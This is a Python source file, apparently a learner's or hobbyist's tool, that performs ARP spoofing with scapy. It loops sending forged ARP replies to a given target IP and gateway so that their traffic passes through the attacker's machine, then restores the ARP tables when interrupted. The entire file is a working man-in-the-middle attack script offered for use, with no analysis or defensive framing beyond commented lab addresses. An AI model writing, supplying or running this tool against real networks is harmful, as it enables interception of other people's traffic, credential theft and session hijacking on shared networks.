#! usr/bin/env/python
import scapy.all as scapy
import time
import sys
import optparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    ethernet_frame = broadcast/arp_request
    answered = scapy.srp(ethernet_frame,timeout = 1, verbose = False)[0]
    return answered[0][1].hwsrc

def restore(ip_source, ip_destination):
    mac_destination = get_mac(ip_destination)
    mac_source = get_mac(ip_source)
    packet = scapy.ARP(op=2, pdst=ip_destination, hwdst=mac_destination, psrc=ip_source, hwsrc = mac_source)
    scapy.send(packet, count = 4,verbose = False)

def spoof(target_ip, spoof_ip):
    mac_address = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = mac_address, psrc = spoof_ip)
    scapy.send(packet, verbose = False)
package_sent = 0


def arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_IP", help="Enter the Target IP")
    parser.add_option("-g", "--gateway", dest="gateway", help="Enter the gateway of the network")
    (options, arguments) = parser.parse_args()
    if not options.target_IP:
        parser.error("[+] Please specify a the IP of the client")
    elif not options.gateway:
        parser.error("[+] Please specify the gateway of the network")
    else:
        return options

options = arguments()

#target_IP = "10.0.2.2"
#gateway = "10.0.2.1"

try:
    while True:
        spoof(options.target_IP,options.gateway)
        spoof(options.gateway, options.target_IP)
        package_sent = package_sent+2
        print("\r[+] Packages sent: "+str(package_sent)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    restore(options.target_IP, options.gateway)
    restore(options.gateway, options.target_IP)
    print("\n[+] ctrl + c Detected, quitting\n Resetting IP tables... please wait ")

